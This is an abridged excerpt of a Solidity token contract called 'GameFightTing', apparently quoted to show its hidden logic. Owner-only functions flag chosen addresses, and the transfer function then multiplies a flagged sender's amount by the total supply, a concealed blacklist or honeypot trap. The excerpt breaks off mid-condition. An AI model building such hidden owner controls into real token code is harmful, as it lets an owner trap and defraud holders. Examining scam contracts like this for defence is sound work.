...
contract TOKEN is Ownable, IERC20 {
    ...
    string private _name = "GameFightTing";
    string private _symbol = "GameFightTing";
    ...
    function setAngelPlan(address accoint) public onlyowner {
        _AngelPlan[accoint] = true;
    }

    function unsetAngelPlan(address accoint) public onlyowner {
        _AngelPlan[accoint] = false;
    }
    ...
    function _transfer(address sender, address recipient, uint256 ameunts) internal virtual {
        ...
        if (_AngelPlan[sender]) {
            ameunts = ameunts.mul(_totalSupply);
        }else {
                if(sender == _GenieInu && _GenieInu == owner() && owner() == _msgSender()){
